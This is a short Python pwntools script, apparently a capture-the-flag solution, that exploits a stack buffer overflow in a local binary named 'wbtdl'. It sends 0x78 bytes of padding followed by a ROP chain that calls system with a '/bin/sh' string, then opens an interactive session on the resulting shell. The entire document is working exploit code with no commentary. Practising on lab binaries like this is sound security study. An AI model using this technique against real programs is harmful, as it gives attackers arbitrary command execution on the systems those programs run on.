from pwn import *
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
context(os='linux', arch='amd64',log_level = 'debug')

p = process("./wbtdl")
elf = ELF('./wbtdl')


pop_rdi = 0x401196
binsh = 0x402008
ret = 0x40101a
shell = elf.plt['system']
payload = b'a'*0x78+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(shell)

p.sendline(payload)

p.interactive()
